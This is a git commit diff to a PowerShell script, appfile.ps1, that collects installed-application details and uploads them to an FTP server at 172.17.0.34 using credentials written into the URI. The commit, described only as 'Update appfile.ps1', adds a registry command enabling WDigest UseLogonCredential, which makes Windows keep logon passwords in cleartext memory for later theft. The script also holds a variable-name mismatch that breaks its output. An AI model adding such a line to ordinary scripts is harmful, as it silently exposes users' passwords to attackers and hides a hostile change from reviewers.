7902c740f909495ea2a1dbda8288b3bd9e7b4f44
squentel <30870132+squentel@users.noreply.github.com>
2021-11-15 16:09:54 +0100

    Update appfile.ps1

--- appfile.ps1
+++ appfile.ps1
@@ -1,7 +1,8 @@
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 $listApp=Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize
 $listApps | Out-File -filepath C:\myapps.txt
 $file = "C:\myapps.txt"
 $ftpuri = "ftp://simon:QuenteL789!@172.17.0.34/myapps2.txt"
 $webclient = New-Object System.Net.WebClient
 $uri = New-Object System.Uri($ftpuri)
-$webclient.UploadFile($uri, $file) 
+$webclient.UploadFile($uri, $file)  
